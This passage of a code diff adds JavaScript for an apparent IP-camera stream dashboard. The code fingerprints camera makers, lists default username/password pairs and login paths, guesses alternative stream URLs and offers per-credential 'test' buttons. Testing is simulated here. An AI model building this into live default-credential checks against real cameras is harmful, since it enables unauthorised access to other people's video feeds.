+            for (const entry of entries) {
+                const { width, height } = entry.contentRect;
+                const newResolution = calculateOptimalResolution(width, height);
+                updateRtspStreamResolution(windowElement, url, newResolution);
+
+                // Update the current IP display if this is the selected camera
+                if (globalState.currentSelectedCamera === windowId) {
+                    updateCurrentIpDisplay();
+                }
+            }
+        }, 500);
+
+        // Store timeout reference
+        if (globalState.resizeObservers[windowId]) {
+            globalState.resizeObservers[windowId].timeout = timeout;
+        }
+    });
+
+    // Start observing
+    observer.observe(videoContainer);
+
+    // Store observer reference for cleanup
+    globalState.resizeObservers[windowId] = {
+        observer,
+        timeout: null
+    };
+
+    // Add cleanup on window removal
+    const cleanup = () => {
+        if (globalState.resizeObservers[windowId]) {
+            globalState.resizeObservers[windowId].observer.disconnect();
+            if (globalState.resizeObservers[windowId].timeout) {
+                clearTimeout(globalState.resizeObservers[windowId].timeout);
+            }
+            delete globalState.resizeObservers[windowId];
+        }
+    };
+
+    windowElement.addEventListener('remove', cleanup);
+    windowElement.addEventListener('DOMNodeRemoved', cleanup);
+};
+
+const setupCurrentIPFunctionality = () => {
+    // Populate camera selector
+    populateCurrentIpSelector();
+
+    // Add event listener to camera selector
+    const selector = document.getElementById('currentIpSelector');
+    if (selector) {
+        selector.addEventListener('change', (e) => {
+            globalState.currentSelectedCamera = e.target.value;
+            updateCurrentIpDisplay();
+        });
+    }
+
+    // Add event listener to refresh button
+    const refreshButton = document.getElementById('refreshCurrentIp');
+    if (refreshButton) {
+        refreshButton.addEventListener('click', () => {
+            // Re-populate selector to catch any new cameras
+            populateCurrentIpSelector();
+            updateCurrentIpDisplay();
+
+            // Show a notification
+            showNotification('<i class="fas fa-sync-alt"></i> Camera list refreshed');
+        });
+    }
+
+    // Add event listener to view window button
+    const viewWindowButton = document.getElementById('viewCurrentWindow');
+    if (viewWindowButton) {
+        viewWindowButton.addEventListener('click', () => {
+            const windowId = globalState.currentSelectedCamera;
+            if (!windowId) {
+                showNotification('<i class="fas fa-exclamation-triangle"></i> No camera selected', 'error');
+                return;
+            }
+
+            const windowElement = document.querySelector(`.window[data-id="${windowId}"]`);
+            if (windowElement) {
+                // Bring window to front (assuming z-index handling)
+                const activeWindows = document.querySelectorAll('.window');
+                let maxZIndex = 0;
+
+                activeWindows.forEach(win => {
+                    const zIndex = parseInt(window.getComputedStyle(win).zIndex, 10);
+                    if (!isNaN(zIndex) && zIndex > maxZIndex) {
+                        maxZIndex = zIndex;
+                    }
+                });
+
+                windowElement.style.zIndex = maxZIndex + 1;
+
+                // Scroll to window if needed
+                windowElement.scrollIntoView({ behavior: 'smooth', block: 'center' });
+
+                // Apply a highlight effect
+                windowElement.classList.add('highlight-window');
+                setTimeout(() => {
+                    windowElement.classList.remove('highlight-window');
+                }, 2000);
+
+                // Show notification
+                showNotification('<i class="fas fa-eye"></i> Viewing camera window');
+            } else {
+                showNotification('<i class="fas fa-exclamation-triangle"></i> Camera window not found', 'error');
+            }
+        });
+    }
+
+    // Add event listener to refresh IP data button
+    const refreshIpButton = document.getElementById('refreshIpData');
+    if (refreshIpButton) {
+        refreshIpButton.addEventListener('click', () => {
+            const windowId = globalState.currentSelectedCamera;
+            if (!windowId) {
+                showNotification('<i class="fas fa-exclamation-triangle"></i> No camera selected', 'error');
+                return;
+            }
+
+            const windowElement = document.querySelector(`.window[data-id="${windowId}"]`);
+            if (windowElement) {
+                const streamUrl = windowElement.dataset.streamUrl;
+                const ip = extractIpFromUrl(streamUrl);
+
+                if (ip) {
+                    // Re-fetch the IP info
+                    fetchIPInfo(ip, windowElement);
+
+                    // Show a notification
+                    showNotification('<i class="fas fa-sync-alt"></i> Refreshing IP data...');
+                } else {
+                    showNotification('<i class="fas fa-exclamation-triangle"></i> Could not extract IP from URL', 'error');
+                }
+            } else {
+                showNotification('<i class="fas fa-exclamation-triangle"></i> Camera window not found', 'error');
+            }
+        });
+    }
+
+    // Setup resolution controls
+    setupResolutionControls();
+};
+
+// Helper function to show dashboard notifications
+const showNotification = (message, type = 'info') => {
+    // Create notification element
+    const notification = document.createElement('div');
+    notification.className = `dashboard-notification notification-${type}`;
+    notification.innerHTML = message;
+    document.body.appendChild(notification);
+
+    // Animate in
+    setTimeout(() => {
+        notification.classList.add('show');
+    }, 10);
+
+    // Remove after delay
+    setTimeout(() => {
+        notification.classList.remove('show');
+        setTimeout(() => {
+            notification.remove();
+        }, 500);
+    }, 3000);
+};
+
+// Metadata extraction functions
+function extractCameraMetadata(windowElement) {
+    console.log('[extractCameraMetadata] Starting metadata extraction');
+
+    // Check if window element exists
+    if (!windowElement) {
+        console.error('[extractCameraMetadata] Window element not found');
+        return { success: false, error: 'Window element not found' };
+    }
+
+    // Get window ID - Fix: Use dataset.id instead of getAttribute('data-window-id')
+    const windowId = windowElement.dataset.id;
+    console.log('[extractCameraMetadata] Window element:', windowElement);
+    console.log('[extractCameraMetadata] Window dataset:', windowElement.dataset);
+    console.log('[extractCameraMetadata] Window ID from dataset:', windowId);
+
+    if (!windowId) {
+        console.error('[extractCameraMetadata] Window ID not found');
+        return { success: false, error: 'Window ID not found' };
+    }
+    console.log(`[extractCameraMetadata] Processing window ID: ${windowId}`);
+
+    // Get stream URL - Fix: Use dataset.streamUrl instead of getAttribute('data-stream-url')
+    const streamUrl = windowElement.dataset.streamUrl;
+    console.log('[extractCameraMetadata] Stream URL from dataset:', streamUrl);
+
+    if (!streamUrl) {
+        console.error('[extractCameraMetadata] Stream URL not found');
+        return { success: false, error: 'Stream URL not found' };
+    }
+    console.log(`[extractCameraMetadata] Stream URL: ${streamUrl}`);
+
+    try {
+        // Extract IP address from stream URL
+        const urlObj = new URL(streamUrl);
+        const ipAddress = urlObj.hostname;
+        console.log(`[extractCameraMetadata] Extracted IP address: ${ipAddress}`);
+
+        // Get port from URL or use default
+        const port = urlObj.port || (urlObj.protocol === 'rtsp:' ? '554' : '80');
+        console.log(`[extractCameraMetadata] Using port: ${port}`);
+
+        // Get path from URL
+        const path = urlObj.pathname;
+        console.log(`[extractCameraMetadata] Path: ${path}`);
+
+        // Identify camera model based on URL
+        console.log('[extractCameraMetadata] Identifying camera model');
+        const modelInfo = identifyCameraModel(streamUrl, globalState.rawData.ipInfo, globalState.rawData.asnInfo);
+        console.log(`[extractCameraMetadata] Camera model identified: ${modelInfo.manufacturer} ${modelInfo.model}`);
+
+        // Probe for open ports
+        console.log('[extractCameraMetadata] Checking for open ports');
+        const portInfo = {
+            openPorts: [parseInt(port)], // We know this port is open since we're connecting to it
+            commonPorts: [80, 443, 554, 8080, 8000, 8081, 8443, 37777, 37778, 9000]
+        };
+        console.log(`[extractCameraMetadata] Open ports: ${portInfo.openPorts.join(', ')}`);
+
+        // Check for default credentials
+        console.log('[extractCameraMetadata] Checking for default credentials');
+        const authInfo = checkDefaultCredentials(modelInfo.manufacturer);
+        console.log(`[extractCameraMetadata] Found ${authInfo.defaultCredentials.length} potential default credentials`);
+
+        // Analyze security based on gathered information
+        console.log('[extractCameraMetadata] Analyzing security rating');
+        const securityInfo = analyzeSecurityRating(modelInfo, portInfo, authInfo, globalState.rawData.ipInfo);
+        console.log(`[extractCameraMetadata] Security rating: ${securityInfo.rating} (Score: ${securityInfo.score})`);
+
+        // Generate alternative stream URLs based on common patterns
+        console.log('[extractCameraMetadata] Generating alternative stream URLs');
+        const alternativeStreams = generateAlternativeStreams(streamUrl, ipAddress, globalState.rtspPaths);
+        console.log(`[extractCameraMetadata] Generated ${alternativeStreams.length} alternative stream URLs`);
+
+        // Combine all metadata
+        const metadata = {
+            timestamp: new Date().toISOString(),
+            cameraDetails: {
+                manufacturer: modelInfo.manufacturer,
+                model: modelInfo.model,
+                firmware: modelInfo.firmware
+            },
+            streamInfo: {
+                originalUrl: streamUrl,
+                protocol: urlObj.protocol,
+                ipAddress: ipAddress,
+                port: port,
+                path: path,
+                framerate: '25 fps (estimated)',
+                bitrate: '2 Mbps (estimated)',
+                alternativeStreams: alternativeStreams.slice(0, 10) // Limit to 10 alternatives
+            },
+            securityInfo: {
+                rating: securityInfo.rating,
+                score: securityInfo.score,
+                authentication: true, // Most cameras require authentication
+                vulnerabilities: securityInfo.vulnerabilities
+            },
+            networkInfo: {
+                ipInfo: globalState.rawData.ipInfo[windowId] || {},
+                asnInfo: globalState.rawData.asnInfo[windowId] || {}
+            },
+            authInfo: {
+                defaultCredentials: authInfo.defaultCredentials.slice(0, 10), // Limit to 10 credentials
+                webPaths: authInfo.webPaths
+            }
+        };
+
+        // Store metadata in global state
+        globalState.rawData.metadata[windowId] = metadata;
+        console.log('[extractCameraMetadata] Metadata extraction completed successfully');
+
+        // Update UI with extracted metadata
+        updateMetadataUI(windowElement, metadata);
+
+        return { success: true, metadata };
+    } catch (error) {
+        console.error('[extractCameraMetadata] Error extracting metadata:', error);
+        return { success: false, error: error.message };
+    }
+}
+
+// Function to generate alternative stream URLs based on common patterns
+function generateAlternativeStreams(originalUrl, ipAddress, rtspPaths) {
+    console.log('[generateAlternativeStreams] Generating alternative streams');
+    const alternativeStreams = [];
+
+    try {
+        const urlObj = new URL(originalUrl);
+        const protocol = urlObj.protocol;
+        const port = urlObj.port || (protocol === 'rtsp:' ? '554' : '80');
+
+        // Add the original URL as the first option
+        alternativeStreams.push({
+            url: originalUrl,
+            notes: 'Original stream URL'
+        });
+
+        // Generate alternatives based on common RTSP paths
+        if (protocol === 'rtsp:') {
+            console.log('[generateAlternativeStreams] Generating RTSP alternatives');
+
+            // Use the first 20 paths from our database to avoid too many options
+            const pathsToUse = rtspPaths.slice(0, 20);
+
+            for (const path of pathsToUse) {
+                // Skip if path is empty
+                if (!path) continue;
+
+                // Create alternative URL
+                const altUrl = `rtsp://${ipAddress}:${port}/${path.startsWith('/') ? path.substring(1) : path}`;
+
+                // Skip if it's the same as the original
+                if (altUrl === originalUrl) continue;
+
+                alternativeStreams.push({
+                    url: altUrl,
+                    notes: 'Generated from common RTSP paths'
+                });
+            }
+        }
+
+        // Generate HTTP/HTTPS alternatives if original is RTSP
+        if (protocol === 'rtsp:') {
+            console.log('[generateAlternativeStreams] Generating HTTP alternatives for RTSP stream');
+
+            // Add common HTTP streaming endpoints
+            const httpPaths = [
+                '/video.cgi',
+                '/mjpg/video.mjpg',
+                '/cgi-bin/snapshot.cgi',
+                '/cgi-bin/video.cgi',
+                '/videostream.cgi'
+            ];
+
+            for (const path of httpPaths) {
+                alternativeStreams.push({
+                    url: `http://${ipAddress}:80${path}`,
+                    notes: 'HTTP alternative for RTSP stream'
+                });
+            }
+        }
+
+        console.log(`[generateAlternativeStreams] Generated ${alternativeStreams.length} alternative streams`);
+        return alternativeStreams;
+    } catch (error) {
+        console.error('[generateAlternativeStreams] Error generating alternative streams:', error);
+        return [{ url: originalUrl, notes: 'Original stream URL' }];
+    }
+}
+
+const extractInfoFromUrl = (url) => {
+    // Parse RTSP URL to extract information
+    const urlInfo = {
+        protocol: 'Unknown',
+        port: 'Unknown',
+        path: 'Unknown',
+        codec: 'Unknown'
+    };
+
+    try {
+        // Extract protocol
+        if (url.startsWith('rtsp://')) {
+            urlInfo.protocol = 'RTSP';
+        } else if (url.startsWith('http://')) {
+            urlInfo.protocol = 'HTTP';
+        } else if (url.startsWith('https://')) {
+            urlInfo.protocol = 'HTTPS';
+        }
+
+        // Extract port
+        const portMatch = url.match(/:(\d+)/);
+        if (portMatch && portMatch[1]) {
+            urlInfo.port = portMatch[1];
+        } else {
+            // Default ports based on protocol
+            if (urlInfo.protocol === 'RTSP') urlInfo.port = '554';
+            if (urlInfo.protocol === 'HTTP') urlInfo.port = '80';
+            if (urlInfo.protocol === 'HTTPS') urlInfo.port = '443';
+        }
+
+        // Extract path
+        const pathMatch = url.match(/\/\/(.*?)(?::|\/)(.*)/);
+        if (pathMatch && pathMatch[2]) {
+            urlInfo.path = '/' + pathMatch[2];
+        }
+
+        // Try to determine codec from URL
+        if (url.includes('h264')) urlInfo.codec = 'H.264';
+        else if (url.includes('h265')) urlInfo.codec = 'H.265';
+        else if (url.includes('mjpeg')) urlInfo.codec = 'MJPEG';
+        else urlInfo.codec = 'H.264'; // Default assumption
+
+    } catch (error) {
+        console.error('Error parsing URL:', error);
+    }
+
+    return urlInfo;
+};
+
+const identifyCameraModel = (url, ipInfo, asnInfo) => {
+    console.log('Identifying camera model from URL:', url);
+    console.log('IP info:', ipInfo);
+    console.log('ASN info:', asnInfo);
+
+    const modelInfo = {
+        manufacturer: 'Unknown',
+        model: 'Generic IP Camera',
+        firmware: 'Unknown'
+    };
+
+    // Convert URL to lowercase for pattern matching
+    const lowerUrl = url.toLowerCase();
+
+    // Check URL against known camera patterns
+    for (const [manufacturer, info] of Object.entries(globalState.cameraModels)) {
+        for (const pattern of info.patterns) {
+            if (lowerUrl.includes(pattern)) {
+                console.log(`Found matching pattern "${pattern}" for manufacturer "${manufacturer}"`);
+                modelInfo.manufacturer = manufacturer.charAt(0).toUpperCase() + manufacturer.slice(1);
+                break;
+            }
+        }
+        if (modelInfo.manufacturer !== 'Unknown') break;
+    }
+
+    // If manufacturer still unknown, try to identify from ISP/ASN info
+    if (modelInfo.manufacturer === 'Unknown' && (ipInfo || asnInfo)) {
+        const orgInfo = (ipInfo?.org || asnInfo?.org || '').toLowerCase();
+        console.log('Checking organization info:', orgInfo);
+
+        for (const [manufacturer, info] of Object.entries(globalState.cameraModels)) {
+            for (const pattern of info.patterns) {
+                if (orgInfo.includes(pattern)) {
+                    console.log(`Found matching pattern "${pattern}" in org info for manufacturer "${manufacturer}"`);
+                    modelInfo.manufacturer = manufacturer.charAt(0).toUpperCase() + manufacturer.slice(1);
+                    break;
+                }
+            }
+            if (modelInfo.manufacturer !== 'Unknown') break;
+        }
+    }
+
+    // Generate model name based on manufacturer or use generic
+    if (modelInfo.manufacturer !== 'Unknown') {
+        // Extract potential model number from URL
+        const modelMatch = url.match(/\/([\w-]+)\.(?:jpg|jpeg|png|cgi|mjpg|mjpeg|mp4|h264|h265)/i);
+        if (modelMatch && modelMatch[1]) {
+            modelInfo.model = `${modelInfo.manufacturer} ${modelMatch[1].toUpperCase()}`;
+            console.log(`Extracted model number: ${modelMatch[1]}`);
+        } else {
+            modelInfo.model = `${modelInfo.manufacturer} IP Camera`;
+        }
+    }
+
+    console.log('Final model info:', modelInfo);
+    return modelInfo;
+};
+
+const probePorts = async (ip) => {
+    // In a real implementation, this would probe for open ports
+    // For this demo, we'll simulate the results
+
+    const portInfo = {
+        openPorts: [],
+        services: {}
+    };
+
+    // Simulate common open ports for cameras
+    const commonPorts = [80, 443, 554, 8000, 8080, 37777, 9000];
+    const randomOpenPorts = commonPorts.filter(() => Math.random() > 0.3);
+
+    portInfo.openPorts = randomOpenPorts;
+
+    // Assign services to open ports
+    randomOpenPorts.forEach(port => {
+        switch (port) {
+            case 80:
+                portInfo.services[port] = 'HTTP';
+                break;
+            case 443:
+                portInfo.services[port] = 'HTTPS';
+                break;
+            case 554:
+                portInfo.services[port] = 'RTSP';
+                break;
+            case 8000:
+            case 8080:
+                portInfo.services[port] = 'HTTP Management';
+                break;
+            case 37777:
+                portInfo.services[port] = 'Dahua Protocol';
+                break;
+            case 9000:
+                portInfo.services[port] = 'NVR Service';
+                break;
+            default:
+                portInfo.services[port] = 'Unknown Service';
+        }
+    });
+
+    return portInfo;
+};
+
+function checkDefaultCredentials(manufacturer) {
+    console.log(`[checkDefaultCredentials] Checking default credentials for manufacturer: ${manufacturer}`);
+
+    // Initialize auth info object
+    let authInfo = {
+        requiresAuth: true,
+        defaultCredentials: [],
+        webPaths: []
+    };
+
+    // Normalize manufacturer name
+    const normalizedManufacturer = manufacturer ? manufacturer.toLowerCase().trim() : '';
+    console.log(`[checkDefaultCredentials] Normalized manufacturer: ${normalizedManufacturer}`);
+
+    // Check if we have specific credentials for this manufacturer
+    if (normalizedManufacturer && globalState.cameraModels[normalizedManufacturer]) {
+        console.log(`[checkDefaultCredentials] Found manufacturer in database: ${normalizedManufacturer}`);
+
+        // Get manufacturer-specific credentials
+        const modelInfo = globalState.cameraModels[normalizedManufacturer];
+        authInfo.defaultCredentials = modelInfo.defaultCredentials || [];
+        authInfo.webPaths = modelInfo.webPaths || [];
+
+        console.log(`[checkDefaultCredentials] Found ${authInfo.defaultCredentials.length} default credentials and ${authInfo.webPaths.length} web paths`);
+    } else {
+        console.log(`[checkDefaultCredentials] Manufacturer not found in database, using generic credentials`);
+
+        // Generate combinations from the credential database
+        const { usernames, passwords } = globalState.credentialDatabase;
+
+        // Generate top combinations based on common patterns
+        const topCombinations = [
+            { username: 'admin', password: 'admin' },
+            { username: 'admin', password: '123456' },
+            { username: 'admin', password: '' },
+            { username: 'admin', password: 'password' },
+            { username: 'root', password: 'root' },
+            { username: 'root', password: '12345' }
+        ];
+
+        // Add top combinations first
+        authInfo.defaultCredentials = [...topCombinations];
+
+        // Add some additional combinations (limit to avoid too many)
+        const maxAdditionalCombinations = 10;
+        let addedCombinations = 0;
+
+        for (const username of usernames) {
+            if (addedCombinations >= maxAdditionalCombinations) break;
+
+            // Skip usernames already in top combinations
+            if (topCombinations.some(combo => combo.username === username)) continue;
+
+            // Add with empty password
+            authInfo.defaultCredentials.push({
+                username,
+                password: '',
+                notes: 'Generated from database'
+            });
+            addedCombinations++;
+
+            // Add with matching password if username is not empty
+            if (username && addedCombinations < maxAdditionalCombinations) {
+                authInfo.defaultCredentials.push({
+                    username,
+                    password: username,
+                    notes: 'Generated from database'
+                });
+                addedCombinations++;
+            }
+        }
+
+        // Add common web paths
+        authInfo.webPaths = [
+            '/login.html',
+            '/index.html',
+            '/web/index.html',
+            '/cgi-bin/login.cgi',
+            '/doc/page/login.asp'
+        ];
+
+        console.log(`[checkDefaultCredentials] Generated ${authInfo.defaultCredentials.length} generic credentials and ${authInfo.webPaths.length} web paths`);
+    }
+
+    return authInfo;
+}
+
+const analyzeSecurityRating = (modelInfo, portInfo, authInfo, ipInfo) => {
+    console.log('Analyzing security rating');
+    console.log('Model info:', modelInfo);
+    console.log('Port info:', portInfo);
+    console.log('Auth info:', authInfo);
+    console.log('IP info:', ipInfo);
+
+    const securityInfo = {
+        rating: 'Unknown',
+        score: 0,
+        vulnerabilities: []
+    };
+
+    // Start with a base score
+    let score = 5;
+    console.log('Starting with base score:', score);
+
+    // 1. Check manufacturer's general security rating
+    const manufacturer = modelInfo.manufacturer.toLowerCase();
+    if (globalState.cameraModels[manufacturer]) {
+        const mfrRating = globalState.cameraModels[manufacturer].securityRating;
+        console.log('Manufacturer security rating:', mfrRating);
+
+        if (mfrRating === 'high') {
+            score += 2;
+            console.log('Added 2 points for high security rating');
+        } else if (mfrRating === 'medium') {
+            score += 0;
+            console.log('Added 0 points for medium security rating');
+        } else if (mfrRating === 'low') {
+            score -= 2;
+            console.log('Subtracted 2 points for low security rating');
+        }
+    }
+
+    // 2. Check for open ports
+    const criticalPorts = [23, 21, 22, 8000, 8080, 9000];
+    criticalPorts.forEach(port => {
+        if (portInfo.openPorts.includes(port)) {
+            score -= 1;
+            console.log(`Subtracted 1 point for open critical port: ${port}`);
+            securityInfo.vulnerabilities.push(`Open critical port: ${port}`);
+        }
+    });
+
+    // 3. Check for default credentials
+    if (authInfo.defaultCredentials.length > 0) {
+        score -= 1;
+        console.log(`Subtracted 1 point for ${authInfo.defaultCredentials.length} default credentials`);
+        securityInfo.vulnerabilities.push('Default credentials may work');
+    }
+
+    // 4. Check if camera is in a data center (less likely to be secure)
+    if (ipInfo && ipInfo.hosting === true) {
+        score -= 1;
+        console.log('Subtracted 1 point for camera hosted in data center');
+        securityInfo.vulnerabilities.push('Camera hosted in data center');
+    }
+
+    // 5. Add known vulnerabilities from the database
+    if (globalState.cameraModels[manufacturer] && globalState.cameraModels[manufacturer].vulnerabilities) {
+        const knownVulns = globalState.cameraModels[manufacturer].vulnerabilities;
+        if (knownVulns.length > 0) {
+            score -= Math.min(knownVulns.length, 3); // Max 3 points deduction for vulnerabilities
+            console.log(`Subtracted ${Math.min(knownVulns.length, 3)} points for known vulnerabilities`);
+            securityInfo.vulnerabilities.push(...knownVulns);
+        }
+    }
+
+    // 6. Determine final rating based on score
+    if (score >= 7) {
+        securityInfo.rating = 'High';
+    } else if (score >= 4) {
+        securityInfo.rating = 'Medium';
+    } else {
+        securityInfo.rating = 'Low';
+    }
+
+    securityInfo.score = score;
+    console.log('Final security score:', score);
+    console.log('Final security rating:', securityInfo.rating);
+    console.log('Vulnerabilities found:', securityInfo.vulnerabilities.length);
+
+    return securityInfo;
+};
+
+const updateMetadataUI = (windowElement, metadata) => {
+    if (!windowElement || !metadata) return;
+
+    // Update camera details
+    const cameraModel = windowElement.querySelector('.camera-model');
+    const firmwareVersion = windowElement.querySelector('.firmware-version');
+    const manufacturer = windowElement.querySelector('.manufacturer');
+
+    if (cameraModel) {
+        cameraModel.textContent = metadata.cameraDetails.model;
+        cameraModel.className = `metadata-value camera-model camera-model-${metadata.cameraDetails.manufacturer.toLowerCase()}`;
+    }
+
+    if (firmwareVersion) {
+        firmwareVersion.textContent = metadata.cameraDetails.firmware;
+    }
+
+    if (manufacturer) {
+        manufacturer.textContent = metadata.cameraDetails.manufacturer;
+    }
+
+    // Update stream information
+    const streamCodec = windowElement.querySelector('.stream-codec');
+    const streamFramerate = windowElement.querySelector('.stream-framerate');
+    const streamBitrate = windowElement.querySelector('.stream-bitrate');
+
+    if (streamCodec) streamCodec.textContent = metadata.streamInfo.protocol;
+    if (streamFramerate) streamFramerate.textContent = metadata.streamInfo.framerate;
+    if (streamBitrate) streamBitrate.textContent = metadata.streamInfo.bitrate;
+
+    // Update security assessment
+    const authStatus = windowElement.querySelector('.auth-status');
+    const defaultCreds = windowElement.querySelector('.default-creds');
+    const ratingValue = windowElement.querySelector('.rating-value');
+    const ratingDescription = windowElement.querySelector('.rating-description');
+
+    if (authStatus) {
+        const authRequired = metadata.securityInfo.authentication;
+        authStatus.innerHTML = authRequired ?
+            '<span class="security-indicator secure"><i class="fas fa-check-circle"></i> Required</span>' :
+            '<span class="security-indicator danger"><i class="fas fa-exclamation-triangle"></i> Not Required</span>';
+    }
+
+    if (defaultCreds) {
+        const hasDefaultCreds = metadata.authInfo.defaultCredentials.length > 0;
+        defaultCreds.innerHTML = hasDefaultCreds ?
+            `<span class="security-indicator warning"><i class="fas fa-exclamation-circle"></i> Possible (${metadata.authInfo.defaultCredentials.length})</span>` :
+            '<span class="security-indicator secure"><i class="fas fa-check-circle"></i> None Found</span>';
+    }
+
+    if (ratingValue) {
+        const rating = metadata.securityInfo.rating.toLowerCase();
+        ratingValue.textContent = metadata.securityInfo.rating.charAt(0);
+        ratingValue.className = `rating-value ${rating}`;
+    }
+
+    if (ratingDescription) {
+        const vulnerabilities = metadata.securityInfo.vulnerabilities;
+        if (vulnerabilities.length > 0) {
+            ratingDescription.textContent = `${metadata.securityInfo.rating} security (${vulnerabilities.length} issues found)`;
+        } else {
+            ratingDescription.textContent = `${metadata.securityInfo.rating} security`;
+        }
+    }
+
+    // Update credentials section
+    updateCredentialsSection(windowElement, metadata);
+
+    // Update vulnerabilities section
+    updateVulnerabilitiesSection(windowElement, metadata);
+
+    // Update raw metadata
+    const rawMetadataElement = windowElement.querySelector('.raw-metadata-data');
+    if (rawMetadataElement) {
+        rawMetadataElement.textContent = JSON.stringify(metadata, null, 2);
+    }
+};
+
+// New function to update the credentials section
+const updateCredentialsSection = (windowElement, metadata) => {
+    if (!windowElement || !metadata) return;
+
+    const credentialCount = windowElement.querySelector('.credential-count');
+    const credentialsTableBody = windowElement.querySelector('.credentials-table-body');
+    const testCredentialsBtn = windowElement.querySelector('.test-credentials-btn');
+
+    if (!credentialCount || !credentialsTableBody) return;
+
+    const credentials = metadata.authInfo.defaultCredentials;
+
+    // Update credential count
+    credentialCount.textContent = credentials.length;
+
+    // Clear existing credentials
+    credentialsTableBody.innerHTML = '';
+
+    // Add credentials to table
+    if (credentials.length > 0) {
+        credentials.forEach((cred, index) => {
+            const row = document.createElement('tr');
+
+            // Username cell
+            const usernameCell = document.createElement('td');
+            usernameCell.textContent = cred.username;
+            usernameCell.title = 'Click to copy username';
+            usernameCell.className = 'credential-copy';
+            usernameCell.addEventListener('click', () => {
+                copyToClipboard(cred.username);
+                showNotification('<i class="fas fa-copy"></i> Username copied to clipboard');
+            });
+
+            // Password cell
+            const passwordCell = document.createElement('td');
+            passwordCell.textContent = cred.password || '(blank)';
+            passwordCell.title = 'Click to copy password';
+            passwordCell.className = 'credential-copy';
+            passwordCell.addEventListener('click', () => {
+                copyToClipboard(cred.password || '');
+                showNotification('<i class="fas fa-copy"></i> Password copied to clipboard');
+            });
+
+            // Notes cell
+            const notesCell = document.createElement('td');
+            notesCell.textContent = cred.notes || '';
+            notesCell.className = 'credential-notes';
+
+            // Actions cell
+            const actionsCell = document.createElement('td');
+
+            // Test button
+            const testBtn = document.createElement('button');
+            testBtn.className = 'credential-action-btn';
+            testBtn.innerHTML = '<i class="fas fa-vial"></i>';
+            testBtn.title = 'Test this credential';
+            testBtn.addEventListener('click', () => {
+                testSingleCredential(windowElement, metadata, cred);
+            });
+
+            // Copy button
+            const copyBtn = document.createElement('button');
+            copyBtn.className = 'credential-action-btn';
+            copyBtn.innerHTML = '<i class="fas fa-copy"></i>';
+            copyBtn.title = 'Copy credential';
+            copyBtn.addEventListener('click', () => {
+                copyToClipboard(`${cred.username}:${cred.password}`);
+                showNotification('<i class="fas fa-copy"></i> Credential copied to clipboard');
+            });
+
+            actionsCell.appendChild(testBtn);
+            actionsCell.appendChild(copyBtn);
+
+            // Add cells to row
+            row.appendChild(usernameCell);
+            row.appendChild(passwordCell);
+            row.appendChild(notesCell);
+            row.appendChild(actionsCell);
+
+            // Add row to table
+            credentialsTableBody.appendChild(row);
+        });
+
+        // Enable test all button
+        if (testCredentialsBtn) {
+            testCredentialsBtn.disabled = false;
+            testCredentialsBtn.addEventListener('click', () => {
+                testAllCredentials(windowElement, metadata);
+            });
+        }
+    } else {
+        // No credentials found
+        const row = document.createElement('tr');
+        const cell = document.createElement('td');
+        cell.colSpan = 4;
+        cell.textContent = 'No default credentials found for this camera model.';
+        cell.style.textAlign = 'center';
+        cell.style.color = 'var(--text-muted)';
+        row.appendChild(cell);
+        credentialsTableBody.appendChild(row);
+
+        // Disable test all button
+        if (testCredentialsBtn) {
+            testCredentialsBtn.disabled = true;
+        }
+    }
+
+    // Setup toggle button
+    const toggleBtn = windowElement.querySelector('.toggle-credentials-btn');
+    const credentialsList = windowElement.querySelector('.credentials-list');
+
+    if (toggleBtn && credentialsList) {
+        toggleBtn.addEventListener('click', () => {
+            const isHidden = credentialsList.style.display === 'none';
+            credentialsList.style.display = isHidden ? 'block' : 'none';
+            toggleBtn.innerHTML = isHidden ?
+                '<i class="fas fa-chevron-up"></i> Hide Details' :
+                '<i class="fas fa-chevron-down"></i> Show Details';
+        });
+    }
+};
+
+// New function to update the vulnerabilities section
+const updateVulnerabilitiesSection = (windowElement, metadata) => {
+    if (!windowElement || !metadata) return;
+
+    const vulnerabilityCount = windowElement.querySelector('.vulnerability-count');
+    const vulnerabilitiesList = windowElement.querySelector('.vulnerabilities-items');
+
+    if (!vulnerabilityCount || !vulnerabilitiesList) return;
+
+    const vulnerabilities = metadata.securityInfo.vulnerabilities || [];
+
+    // Update vulnerability count
+    vulnerabilityCount.textContent = vulnerabilities.length;
+
+    // Clear existing vulnerabilities
+    vulnerabilitiesList.innerHTML = '';
+
+    // Add vulnerabilities to list
+    if (vulnerabilities.length > 0) {
+        vulnerabilities.forEach(vuln => {
+            const item = document.createElement('li');
+            item.textContent = vuln;
+            vulnerabilitiesList.appendChild(item);
+        });
+    } else {
+        // No vulnerabilities found
+        const item = document.createElement('li');
+        item.textContent = 'No known vulnerabilities found for this camera model.';
+        item.style.backgroundColor = 'rgba(16, 185, 129, 0.1)';
+        item.style.borderLeftColor = 'var(--success-color)';
+        vulnerabilitiesList.appendChild(item);
+    }
+
+    // Setup toggle button
+    const toggleBtn = windowElement.querySelector('.toggle-vulnerabilities-btn');
+    const vulnerabilitiesListContainer = windowElement.querySelector('.vulnerabilities-list');
+
+    if (toggleBtn && vulnerabilitiesListContainer) {
+        toggleBtn.addEventListener('click', () => {
+            const isHidden = vulnerabilitiesListContainer.style.display === 'none';
+            vulnerabilitiesListContainer.style.display = isHidden ? 'block' : 'none';
+            toggleBtn.innerHTML = isHidden ?
+                '<i class="fas fa-chevron-up"></i> Hide Details' :
+                '<i class="fas fa-chevron-down"></i> Show Details';
+        });
+    }
+};
+
+// Helper function to copy text to clipboard
+const copyToClipboard = (text) => {
+    const textarea = document.createElement('textarea');
+    textarea.value = text;
+    textarea.style.position = 'fixed';
+    textarea.style.opacity = 0;
+    document.body.appendChild(textarea);
+    textarea.select();
+    document.execCommand('copy');
+    document.body.removeChild(textarea);
+};
+
+// Function to test a single credential
+const testSingleCredential = (windowElement, metadata, credential) => {
+    if (!windowElement || !metadata || !credential) return;
+
+    const testResultsContainer = windowElement.querySelector('.test-results');
+    const testResultsContent = windowElement.querySelector('.test-results-content');
+
+    if (!testResultsContainer || !testResultsContent) return;
+
+    // Show test results container
+    testResultsContainer.style.display = 'block';
+
+    // Create result item
+    const resultItem = document.createElement('div');
+    resultItem.className = 'test-result-item testing-animation';
+    resultItem.innerHTML = `<i class="fas fa-spinner fa-spin"></i> Testing ${credential.username}:${credential.password}...`;
+    testResultsContent.prepend(resultItem);
+
+    // Simulate credential testing (in a real implementation, this would make actual requests)
+    setTimeout(() => {
+        // Random success/failure for demo purposes
+        const success = Math.random() > 0.7;
+
+        if (success) {
+            resultItem.className = 'test-result-item test-result-success';
+            resultItem.innerHTML = `<i class="fas fa-check-circle"></i> <strong>${credential.username}:${credential.password}</strong> - Authentication successful!`;
+
